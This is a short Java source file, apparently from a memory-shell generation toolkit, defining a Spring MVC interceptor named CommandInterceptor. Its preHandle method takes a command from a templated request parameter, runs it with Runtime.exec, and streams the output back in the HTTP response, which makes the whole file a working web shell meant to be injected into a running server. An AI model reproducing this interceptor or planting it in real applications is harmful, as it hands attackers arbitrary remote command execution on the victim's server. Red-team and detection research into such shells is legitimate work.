package com.reajason.javaweb.memshell.springmvc.command;

import org.springframework.web.servlet.AsyncHandlerInterceptor;

import javax.servlet.ServletOutputStream;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.InputStream;

/**
 * @author ReaJason
 * @since 2024/12/22
 */
public class CommandInterceptor implements AsyncHandlerInterceptor {
    public String paramName = "{{paramName}}";


    public CommandInterceptor() {
    }

    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
        try {
            String cmd = request.getParameter(paramName);
            if (cmd != null) {
                Process exec = Runtime.getRuntime().exec(cmd);
                InputStream inputStream = exec.getInputStream();
                ServletOutputStream outputStream = response.getOutputStream();
                byte[] buf = new byte[8192];
                int length;
                while ((length = inputStream.read(buf)) != -1) {
                    outputStream.write(buf, 0, length);
                }
                return false;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return true;
    }
}
